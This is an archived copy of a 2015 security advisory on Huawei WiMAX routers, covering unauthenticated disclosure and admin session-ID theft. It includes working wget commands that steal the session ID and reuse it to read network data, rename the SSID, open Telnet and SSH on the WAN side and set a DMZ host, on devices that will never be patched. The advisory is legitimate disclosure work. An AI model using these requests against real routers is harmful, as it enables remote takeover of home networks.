@@ -1,0 +1,310 @@
+id: 24638
+date: 12/01/2015
+title: Huawei Wimax CSRF / Information Disclosure / Manipulation Vulnerabilities
+author: Pierre Kim
+cves: 
+
+## Advisory Information
+
+Title: Huawei Wimax routers vulnerable to multiple threats
+Advisory URL: https://pierrekim.github.io/advisories/2015-huawei-0x01.txt
+Blog URL: https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html
+Date published: 2015-12-01
+Vendors contacted: Huawei, CERT.org
+Release mode: Released
+CVE: no current CVE
+CERT Tracking number: VU#406192
+CNNVD: no current CNNVD
+
+
+
+## Product Description
+
+Huawei Technologies Co. Ltd. is a Chinese multinational networking
+and telecommunications equipment and services company.
+It is the largest telecommunications equipment manufacturer in the world.
+
+
+
+## Vulnerabilities Summary
+
+The Huawei BM626e device is a Wimax router / access point overall badly
+designed with a lot of vulnerabilities. The device is provided by
+MTN Cote d'Ivoire as a "Wibox". It's available in a number of countries to
+provide Internet with a Wimax network.
+
+The tests below are done using the last available firmware
+(firmware V100R001CIVC24B010).
+
+Note: This firmware is being used by other Huawei Wimax CPEs and
+Huawei confirmed that the devices below are vulnerable to the same threats:
+
+  - EchoLife BM626e WiMAX CPE
+  - EchoLife BM626 WiMAX CPE
+  - EchoLife BM635 WiMAX CPE
+  - EchoLife BM632 WiMAX CPE
+  - EchoLife BM631a WiMAX CPE
+  - EchoLife BM632w WiMAX CPE
+  - EchoLife BM652 WiMAX CPE
+
+The routers are still on sale and used in several countries. They are
+used, at least, in these countries:
+
+  - MTN CI (Cote d'Ivoire)
+  - Iran Cell (Iran)
+  - Irak Telecom (Irak)
+  - Libyamax (Libya)
+  - Globe Telecom (Philippines)
+  - Zain Bahrain (Bahrain)
+  - FreshTel (Ukraine)
+
+
+
+## Details - unauthenticated information disclosure
+
+By default, the webpage http://192.168.1.1/check.html contains
+important information
+(wimax configuration, network configuration, wifi and sip
+configuration ...) and is reachable without authentication.
+
+A JavaScript redirection will annoy the attacker (/login.html) and can
+be easily defeated by using wget:
+
+  root@kali:~# wget http://192.168.1.1/check.html; less check.html
+
+
+
+## Details - Admin session cookie hijacking
+
+If an admin is currently managing the device (OR used the device but
+didn't properly disconnect),
+the current/used session can be stolen by an attacker located in the
+LAN (or WAN if the HTTP is open in the WAN interface).
+
+The admin session id ("SID") can be recovered in multiple webpages
+without authentication:
+
+  - http://192.168.1.1/wimax/security.html
+  - http://192.168.1.1/static/deviceinfo.html
+  - ...
+
+The security.html webpage contains a valid session ID, without
+authentication, within the JavaScript sources:
+
+  sid="SID24188"
+
+
+A "protection" is written in JavaScript and will redirect the attacker
+to the login webpage
+but the Javascript contains the session of the admin (sid="SIDXXXXX")
+so the attacker can retrieve it easily using wget:
+
+  root@kali:~# wget http://192.168.1.1/wimax/security.html ; less security.html
+  root@kali:~# wget http://192.168.1.1/static/deviceinfo.html ; less
+deviceinfo.html
+
+Note that, by visiting the webpages, the attacker will also disconnect
+the administrator from the Control Panel (http://192.168.1.1/)
+
+
+
+## Details - Information disclosure and CSRF using the stolen admin session ID
+
+By using the previously stolen SID, it is possible to perform
+administration tasks without having proper credentials:
+
+  - editing the WLAN configuration,
+  - editing the WAN configuation,
+  - editing the LAN configuration,
+  - opening HTTP/HTTPS/TELNET/SSH in the LAN and WAN interfaces,
+  - changing DMZ configurations,
+  - editing PortMapping,
+  - editing Porttrigger,
+  - editing SIP configuration,
+  - uploading a custom firmware,
+  - ...
+
+
+o Retrieve private information (network information):
+
+
+  root@kali:~# wget -qO-
+'http://192.168.1.1/static/rethdhcp.jsx?WWW_SID=SID24188&t=0'
+  Saving to: `STDOUT'
+
+  stats={};do{stats.dhcplist="44:8A:5B:AA:AA:AA,192.168.1.3,71:52:02@00:E0:4C:AA:AA:AA,192.168.1.2,71:52:02";
+  stats.reth="
+       eth0      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
+           RX packets:27 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:109 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+           RX bytes:2887 (2.8 KiB)  TX bytes:46809 (45.7 KiB)
+           Interrupt:9 Base address:0x4000
+       eth1      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:
+           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+           Interrupt:9 Base address:0x4000
+   eth2      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
+           RX packets:2530 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:2619 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+           RX bytes:351557 (343.3 KiB)  TX bytes:536669 (524.0 KiB)
+           Interrupt:9 Base address:0x4000
+   eth3      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:1
+           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+            RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+           Interrupt:9 Base address:0x4000
+   ";stats.wlaninfo="
+   wl0       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+           RX packets:5257 errors:0 dropped:0 overruns:0 frame:0
+           TX packets:846 errors:0 dropped:0 overruns:0 carrier:0
+           collisions:0 txqueuelen:1000
+           RX bytes:1117126 (1.0 MiB)  TX bytes:279600 (273.0 KiB)
+   wl1       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
+           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+           RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+           [...]
+
+  root@kali:~#
+
+
+
+o Retrieve private information:
+
+An other JSX webpage:
+http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&&t=0
+
+  root@kali:~# wget -qO-
+'http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&&t=0'
+  stats={};do{stats.PPPoEStatus='Disconnected';
+stats.GREStatus='Disconnected';stats.wpsmode="7";stats.position="Idle,Idle,"}while(0);
+
+It's possible to get a lot of information by abusing JSX webpages.
+Listing the JSX webpages is left as an exercise for the reader.
+
+
+
+
+The Session ID can be used to change parameters in the Wimax router too:
+
+o Editing the WLAN configuration:
+
+This request will change the first SSID name to 'powned' (you need to
+edit the WWW_SID, by the one provided in the /wimax/security.html
+webpage):
+
+  root@kali:~# wget --no-cookies --header "Cookie:
+LoginTimes=0:LoginOverTime=0; FirstMenu=User_1; SecondMenu=User_1_1;
+ThirdMenu=User_1_1_1"
+--post-data='WWW_SID=SID24188&REDIRECT=wlan.html&SERVICE=wifi&SLEEP=2&WLAN_WifiEnable=1&Wlan_chkbox=0&WLAN_WirelessMode=9&WLAN_Channel=0&WLAN_SSID1=powned&WLAN_HideSSID=0%3B0%3B&WLAN_AuthMode=WPAPSKWPA2PSK%3BWPAPSKWPA2PSK%3B&WLAN_EncrypType=TKIPAES%3BTKIPAES%3B&WLAN_COUNTRY_REGION=1&WLAN_Country_Code=1d&WLAN_TXPOWER_NOR=13&WLAN_MAXNUM_STA=16%3B16%3B&WLAN_FragThreshold=2346&WLAN_BeaconPeriod=100&WLAN_RTSThreshold=2347&WLAN_BssidNum=2&WLAN_WscConfMode=7&WLAN_WscAction=3&WLAN_CountryCode=CI&WLAN_WscPinCode=&WLAN_TXRATE=0&WLAN_HTBW=0&WLAN_NTH_SSID=1&WLAN_PinFlag=2'
+http://192.168.1.1/basic/mtk.cgi
+
+
+o Opening the management interface:
+
+This request will open HTTP/HTTPS/TELNET/SSH in the LAN AND the WAN
+interfaces (you need to edit the WWW_SID, by the one provided in the
+/wimax/security.html webpage):
+
+  root@kali:~# wget --no-cookies --header "Cookie:
+LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1;
+ThirdMenu=User_2_1_0"
+--post-data='WWW_SID=SID24188&REDIRECT=acl.html&SERVICE=mini_httpd%2Cmini_httpsd%2Ctelnetd%2Cdropbear&SLEEP=2&HTTPD_ENABLE=1&HTTPSD_ENABLE=1&MGMT_WEB_WAN=1&MGMT_TELNET_LAN=1&MGMT_TELNET_WAN=1&MGMT_SSH_LAN=1&MGMT_SSH_WAN=1&HTTPD_PORT=80&httpslan=getValue%28&HTTPSD_PORT=443&TELNETD_PORT=23&SSHD_PORT=22'
+http://192.168.1.1/basic/mtk.cgi
+
+  (The legit administrator can check the changes here:
+http://192.168.1.1/advanced/acl.html)
+
+
+o Changing "DMZ action" - redirecting WAN ports to a target client
+located in the LAN (you need to edit the WWW_SID, by the one provided
+in the /wimax/security.html webpage):
+
+  root@kali:~# wget --no-cookies --header "Cookie:
+LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1;
+ThirdMenu=User_2_1_0"
+--post-data='WWW_SID=SID24188&REDIRECT=dmz.html&SERVICE=netfilter_dmz&NETFILTER_DMZ_HOST=192.168.1.2&NETFILTER_DMZ_ENABLE=1&DMZInterface=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1&DMZHostIPAddress=192.168.1.2&DMZEnable=on&TriggerPort=&TriggerPortEnd='
+http://192.168.1.1/advanced/user.cgi
+
+  (The legit administrator can check the changes here:
+http://192.168.1.1/advanced/dmz.html)
+
+
+Other actions are possible and are left as an exercise for the reader:
+
+  - Editing PortMapping
+  - Editing Porttrigger
+  - Editing Sip configuration
+  - Uploading a custom firmware
+  - ...
+
+
+
+## Vendor Response
+
+The vulnerable routers are in the End Of Service cycle and will not be
+supported anymore.
+
+The vendor encourages its clients to discard existing unsupported models
+and to use new routers.
+
+
+
+## Report Timeline
+
+ * Jul 01, 2015: Vulnerabilities found by Pierre Kim.
+ * Oct 28, 2015: Huawei PSIRT is notified of the vulnerabilities.
+ * Oct 28, 2015: Huawei PSIRT confirms the notification.
+ * Nov 03, 2015: Huawei PSIRT is unable to reproduce the
+vulnerabilities ("We cannot open the following web pages without
+authentication")
+ * Nov 03, 2015: Pierre Kim informs Huawei to desactivate JavaScript
+and gives Huawei a complete scenario with Linux commands. Pierre Kim
+asks their firmware version.
+ * Nov 04, 2015: Pierre Kim asks Huawei about potential difficulties
+with the provided scenario.
+ * Nov 05, 2015: Huawei PSIRT says that they are currently working on
+the firmware version issue and will notify in due course.
+ * Nov 09, 2015: Huawei PSIRT confirms the vulnerabilities affecting
+EchoLife BM626e WiMAX CPE. "All the versions of this product are
+vulnerable".
+ * Nov 09, 2015: Pierre Kim asks about 8 other Wimax models which are
+likely to be vulnerable too (using the same firmware) and asks about
+if security patches will be distributed or the devices are EoL.
+ * Nov 11, 2015: Huawei PSIRT notifies the investigation of 8 other
+Wimax models is in progress.
+ * Nov 18, 2015: Huawei PSIRT confirms 6 models are affected (EchoLife
+BM626 WiMAX CPE, EchoLife BM635 WiMAX CPE, EchoLife BM632 WiMAX CPE,
+EchoLife BM631a WiMAX CPE, EchoLife BM632w WiMAX CPE, EchoLife BM652
+WiMAX CPE). The routers are in the End Of Service cycle and Huawei
+would not support these models or provide fixed version or patch.
+ * Nov 18, 2015: Huawei PSIRT asks to be notified when the advisory is posted.
+ * Nov 19, 2015: Pierre Kim contacts CERT.org about the vulnerabilities.
+ * Nov 23, 2015: Cert.org assigns VU#406192.
+ * Nov 30, 2015: Pierre Kim indicates to Huawei PSIRT that he will
+release the advisory the December 1, 2015.
+ * Dec 01, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-huawei-0x01.txt
+https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html
+
+#  0day.today [2023-03-26]  #
